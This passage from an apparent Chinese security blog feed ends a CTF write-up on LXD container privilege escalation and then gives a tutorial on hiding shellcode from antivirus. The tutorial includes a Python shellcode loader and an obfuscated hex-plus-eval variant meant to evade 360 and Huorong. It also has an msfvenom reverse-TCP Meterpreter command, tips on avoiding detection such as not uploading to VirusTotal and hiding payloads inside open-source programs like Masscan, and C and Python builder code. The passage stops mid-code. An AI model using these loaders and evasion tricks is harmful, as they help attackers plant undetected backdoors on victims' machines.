dmagicsec</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/Ue9ece94b2eb54f5b809b09c83d6acdd9L.jpg" alt="image-20201218102541247"></p><p>初始化容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc init dmagicsec dmagicsec -c security.privileged&#x3D;true</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U53b7ba71a3594eb6a94cebed6bffcbf7F.jpg" alt="image-20201218103022044"></p><p>映射容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc config device add dmagicsec dmagicsec disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U1d240e92373341f9afd8c3eceb5c4c46e.jpg" alt="image-20201218103045116"></p><p>启动容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc start dmagicsec</span><br></pre></td></tr></table></figure><p>执行交互shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc exec dmagicsec &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/12/23/r6HNHf.png" alt="image-20201218103123276"></p><p>获取flag</p><p><img src="https://ae01.alicdn.com/kf/U590ad272f52243c991fc63f3a0c744c0K.jpg" alt="image-20201218103254958"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Shellcode免杀入门教程</title>
      <link href="2020/12/23/shellcode%E5%85%8D%E6%9D%80/"/>
      <url>2020/12/23/shellcode%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Shellcode执行工具编写思路"><a href="#Shellcode执行工具编写思路" class="headerlink" title="Shellcode执行工具编写思路"></a>Shellcode执行工具编写思路</h2><p>为了给大家讲怎么写shellcode执行盒，我特地找了一段Python的源代码，给大家分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="built_in">len</span>(shellcode)),ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">ht=ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>首先引入ctypes模块，接着将shellcode代码赋值给变量hex解码（MSF或Cs生成的之后，使用编码工具手动编码一次。），转换为字节数组。然后，使用ctypes，调用windows自带的dll，也就是Kernel32，使用VirtualAlloc函数，分配内存，返回分配的首地址。然后再使用RtlMoveMemory，将shellcode拷贝到目标内存。使用CreateThread创建一个线程，使用WaitForSingleObject执行内存。总之，就是调用Kernel32.dll中的函数来编写Shellcode执行工具，不止这一种放法。作者水平有限，请勿断章取义。</p><h2 id="编写Shellcode执行工具"><a href="#编写Shellcode执行工具" class="headerlink" title="编写Shellcode执行工具"></a>编写Shellcode执行工具</h2><p>为了验证我们前面的思路是正确的，让我用其他语言来验证一下。这里，我们使用易语言吧，尽可能让大家看懂编写过程。</p><p>新建一个windows窗口程序</p><p><img src="https://img.rruu.net/image/5fd5d92d1c176" alt="image-20201213155240640.png"></p><p>画一个界面出来，大概就这样。</p><p><img src="https://img.rruu.net/image/5fd5d92d1c78f" alt="image-20201211165535513"></p><p>双击按钮来到添加事件，来到编辑界面。添加一个精易模块，等会要用他里面的方法来编写shellcode。创建shellcode变量，用来储存shellcode。</p><p><img src="https://img.rruu.net/image/5fd5d92d1f9bf" alt="image-20201211170702523"></p><p>查看模块手册，就会发现模块自带VirtualAlloc RtlMoveMemory CreateThread WaitForSingleObject这四个方法，我们直接使用即可。</p><p>最终编写如下，如果你仔细比对Python源代码，你会发现真的基本上就是差不多的。</p><p><img src="https://img.rruu.net/image/5fd5d92d1f8d7" alt="image-20201211171754154"></p><p>最后，让我们来测试一下吧。</p><p>MSF生成一个小弹窗测试一下。</p><p><img src="https://img.rruu.net/image/5fd5d92d7cd4d" alt="image-20201211173115244"></p><p>使用一下K8飞刀的编码工具</p><p><img src="https://img.rruu.net/image/5fd5d636ef847" alt="image-20201213161344141"></p><p>获得编码以后的shellcode </p><p><img src="https://img.rruu.net/image/5fd5d6179229d" alt="image-20201213161359195"></p><p>获得HEx编码的Shellcode，复制粘贴到加载测试工具中，点击加载shellcode。我们就可以执行啦。</p><p><img src="https://img.rruu.net/image/5fd5d66d35008" alt="image-20201211173225308"></p><p>最后，总结一下，我们的思路没有错，确实是这样写的，各位不妨试试其他语言写一下，自己多动手体会体会啦。</p><h2 id="Shellcode上线免杀思路"><a href="#Shellcode上线免杀思路" class="headerlink" title="Shellcode上线免杀思路"></a>Shellcode上线免杀思路</h2><p>个人经验告诉你，用Python Ruby这类解释型语言，打包成EXE就算是正常程序也很有可能被拦截，而像C和GO以及C++这种编译型语言则不会有这种问题。建议各位免杀，放在虚拟机，并且断网防止被上传，自己弄了老半天的东西免杀成了，却坚持不了多久。还有也不要上传VT等杀毒网站，会被厂商拿去分析的。免杀的时候也不要上传到类似于360的云查杀。下面我来叙述一下我的思路。</p><p>首先，我给出一段免杀360与火绒的Python加载器源代码。细心的小伙伴们可能会发现，这跟上面第一部分我给出的源代码很像。对的，这个就是在那个基础上运用了一下加密手段，来进行免杀的。使用hex将，360查杀的部分给藏了起来。在运行的时候，首先解密字符串，然后eval执行，运用了等价替换的思路。问题来了，我为什么知道360查杀这里？这里给大家一个小方法，那就是不断的FUzz。像下文这段代码，我发现去掉ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))，然后打包成exe，360则不查杀，就是不断的去尝试，最后知道他查杀哪里。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">a &#x3D; &quot;shellcode&quot;</span><br><span class="line">shellcode&#x3D;bytearray(a.decode(&quot;hex&quot;))</span><br><span class="line">ptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))</span><br><span class="line">buf &#x3D; (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">shell &#x3D; &quot;6374797065732e77696e646c6c2e6b65726e656c33322e52746c4d6f76654d656d6f7279286374797065732e635f696e7428707472292c206275662c206374797065732e635f696e74286c656e287368656c6c636f6465292929&quot;</span><br><span class="line">eval(shell.decode(&quot;hex&quot;))</span><br><span class="line">ht &#x3D; ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure><p>第二个思路，使用一些正常滴开源项目，在里面加点料，达到免杀。经过本人不断地测试，发现效果属实顶。VT查杀轻轻松松可以控制在8左右。而且，相对于第一个思路来说，也更加容易，适合新手朋友。这里给出效果图，使用的是Masscan。</p><p><img src="https://img.rruu.net/image/5fd5d6d8157f2" alt="1"></p><p>稍微给Masscan加了点料</p><p><img src="https://img.rruu.net/image/5fd5d6fa908c7" alt="image-20201211175252005"></p><h2 id="Shellcode免杀实战"><a href="#Shellcode免杀实战" class="headerlink" title="Shellcode免杀实战"></a>Shellcode免杀实战</h2><p>首先，去github上随手一搜索C写的程序，你开心就好。然后下载到本地，打开。我这里用的是vs2019，你们也可以用其他的，没有硬性要求。第一，这里准备两个东西，一个是base64加密解密的code，另外一个是反转字符串的code。第二，找开源程序的时候，注意文件大小，太小的效果不好，太大的又太臃肿，几百K左右也可以，但是其实也没有那么大的硬性要求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">static const unsigned char pr2six[256] &#x3D;</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;* ASCII table *&#x2F;</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,</span><br><span class="line">    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,</span><br><span class="line">    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,</span><br><span class="line">    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span><br><span class="line">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64</span><br><span class="line">&#125;;</span><br><span class="line">int Base64decode_len(const char* bufcoded)</span><br><span class="line">&#123;</span><br><span class="line">    int nbytesdecoded;</span><br><span class="line">    register const unsigned char* bufin;</span><br><span class="line">    register int nprbytes;</span><br><span class="line">    bufin &#x3D; (const unsigned char*)bufcoded;</span><br><span class="line">    while (pr2six[*(bufin++)] &lt;&#x3D; 63);</span><br><span class="line">    nprbytes &#x3D; (bufin - (const unsigned char*)bufcoded) - 1;</span><br><span class="line">    nbytesdecoded &#x3D; ((nprbytes + 3) &#x2F; 4) * 3;</span><br><span class="line">    return nbytesdecoded + 1;</span><br><span class="line">&#125;</span><br><span class="line">int Base64decode(char* bufplain, const char* bufcoded)</span><br><span class="line">&#123;</span><br><span class="line">    int nbytesdecoded;</span><br><span class="line">    register const unsigned char* bufin;</span><br><span class="line">    register unsigned char* bufout;</span><br><span class="line">    register int nprbytes;</span><br><span class="line">    bufin &#x3D; (const unsigned char*)bufcoded;</span><br><span class="line">    while (pr2six[*(bufin++)] &lt;&#x3D; 63);</span><br><span class="line">    nprbytes &#x3D; (bufin - (const unsigned char*)bufcoded) - 1;</span><br><span class="line">    nbytesdecoded &#x3D; ((nprbytes + 3) &#x2F; 4) * 3;</span><br><span class="line">    bufout &#x3D; (unsigned char*)bufplain;</span><br><span class="line">    bufin &#x3D; (const unsigned char*)bufcoded;</span><br><span class="line">    while (nprbytes &gt; 4) &#123;</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span><br><span class="line">        bufin +&#x3D; 4;</span><br><span class="line">        nprbytes -&#x3D; 4;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;* Note: (nprbytes &#x3D;&#x3D; 1) would be an error, so just ingore that case *&#x2F;</span><br><span class="line">    if (nprbytes &gt; 1) &#123;</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nprbytes &gt; 2) &#123;</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (nprbytes &gt; 3) &#123;</span><br><span class="line">        *(bufout++) &#x3D;</span><br><span class="line">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span><br><span class="line">    &#125;</span><br><span class="line">    *(bufout++) &#x3D; &#39;\0&#39;;</span><br><span class="line">    nbytesdecoded -&#x3D; (4 - nprbytes) &amp; 3;</span><br><span class="line">    return nbytesdecoded;</span><br><span class="line">&#125;</span><br><span class="line">static const char basis_64[] &#x3D;</span><br><span class="line">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int Base64encode_len(int len)</span><br><span class="line">&#123;</span><br><span class="line">    return ((len + 2) &#x2F; 3 * 4) + 1;</span><br><span class="line">&#125;</span><br><span class="line">int Base64encode(char* encoded, const char* string, int len)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    char* p;</span><br><span class="line">    p &#x3D; encoded;</span><br><span class="line">    for (i &#x3D; 0; i &lt; len - 2; i +&#x3D; 3) &#123;</span><br><span class="line">        *p++ &#x3D; basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span><br><span class="line">        *p++ &#x3D; basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span><br><span class="line">            ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span><br><span class="line">        *p++ &#x3D; basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2) |</span><br><span class="line">            ((int)(string[i + 2] &amp; 0xC0) &gt;&gt; 6)];</span><br><span class="line">        *p++ &#x3D; basis_64[string[i + 2] &amp; 0x3F];</span><br><span class="line">    &#125;</span><br><span class="line">    if (i &lt; len) &#123;</span><br><span class="line">        *p++ &#x3D; basis_64[(string[i] &gt;&gt; 2) &amp; 0x3F];</span><br><span class="line">        if (i &#x3D;&#x3D; (len - 1)) &#123;</span><br><span class="line">            *p++ &#x3D; basis_64[((string[i] &amp; 0x3) &lt;&lt; 4)];</span><br><span class="line">            &#x2F;&#x2F; *p++ &#x3D; &#39;&#x3D;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            *p++ &#x3D; basis_64[((string[i] &amp; 0x3) &lt;&lt; 4) |</span><br><span class="line">                ((int)(string[i + 1] &amp; 0xF0) &gt;&gt; 4)];</span><br><span class="line">            *p++ &#x3D; basis_64[((string[i + 1] &amp; 0xF) &lt;&lt; 2)];</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;*p++ &#x3D; &#39;&#x3D;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    *p++ &#x3D; &#39;\0&#39;;</span><br><span class="line">    return p - encoded;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string_change(unsigned char* p) &#123;</span><br><span class="line">    int i, len;</span><br><span class="line">    char temp;</span><br><span class="line">    len &#x3D; strlen(p);</span><br><span class="line">    for (size_t i &#x3D; 0; i &lt; (len &#x2F; 2); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        temp &#x3D; p[i];</span><br><span class="line">        p[i] &#x3D; p[len - 1 - i];</span><br><span class="line">        p[len - 1 - i] &#x3D; temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MSF生成代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.132.128 lport=4444 -f c -o shell.c</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fd5d71657b90" alt="image-20201212122320561"></p><p>这里用一下base.py处理一下文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,sys</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;#include &lt;string.h&gt;</span></span><br><span class="line"><span class="string">#pragma comment(linker,&quot;/subsystem:\\&quot;Windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)</span></span><br><span class="line"><span class="string">//windows控制台程序不出黑窗口</span></span><br><span class="line"><span class="string">static const unsigned char pr2six[256] =</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,</span></span><br><span class="line"><span class="string">    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,</span></span><br><span class="line"><span class="string">    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,</span></span><br><span class="line"><span class="string">    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,</span></span><br><span class="line"><span class="string">    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">int Base64decode_len(const char* bufcoded)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int nbytesdecoded;</span></span><br><span class="line"><span class="string">    register const unsigned char* bufin;</span></span><br><span class="line"><span class="string">    register int nprbytes;</span></span><br><span class="line"><span class="string">    bufin = (const unsigned char*)bufcoded;</span></span><br><span class="line"><span class="string">    while (pr2six[*(bufin++)] &lt;= 63);</span></span><br><span class="line"><span class="string">    nprbytes = (bufin - (const unsigned char*)bufcoded) - 1;</span></span><br><span class="line"><span class="string">    nbytesdecoded = ((nprbytes + 3) / 4) * 3;</span></span><br><span class="line"><span class="string">    return nbytesdecoded + 1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int Base64decode(char* bufplain, const char* bufcoded)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int nbytesdecoded;</span></span><br><span class="line"><span class="string">    register const unsigned char* bufin;</span></span><br><span class="line"><span class="string">    register unsigned char* bufout;</span></span><br><span class="line"><span class="string">    register int nprbytes;</span></span><br><span class="line"><span class="string">    bufin = (const unsigned char*)bufcoded;</span></span><br><span class="line"><span class="string">    while (pr2six[*(bufin++)] &lt;= 63);</span></span><br><span class="line"><span class="string">    nprbytes = (bufin - (const unsigned char*)bufcoded) - 1;</span></span><br><span class="line"><span class="string">    nbytesdecoded = ((nprbytes + 3) / 4) * 3;</span></span><br><span class="line"><span class="string">    bufout = (unsigned char*)bufplain;</span></span><br><span class="line"><span class="string">    bufin = (const unsigned char*)bufcoded;</span></span><br><span class="line"><span class="string">    while (nprbytes &gt; 4) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[bufin[2]] &lt;&lt; 6 | pr2six[bufin[3]]);</span></span><br><span class="line"><span class="string">        bufin += 4;</span></span><br><span class="line"><span class="string">        nprbytes -= 4;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    /* Note: (nprbytes == 1) would be an error, so just ingore that case */</span></span><br><span class="line"><span class="string">    if (nprbytes &gt; 1) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[*bufin] &lt;&lt; 2 | pr2six[bufin[1]] &gt;&gt; 4);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (nprbytes &gt; 2) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned char)(pr2six[bufin[1]] &lt;&lt; 4 | pr2six[bufin[2]] &gt;&gt; 2);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (nprbytes &gt; 3) &#123;</span></span><br><span class="line"><span class="string">        *(bufout++) =</span></span><br><span class="line"><span class="string">            (unsigned 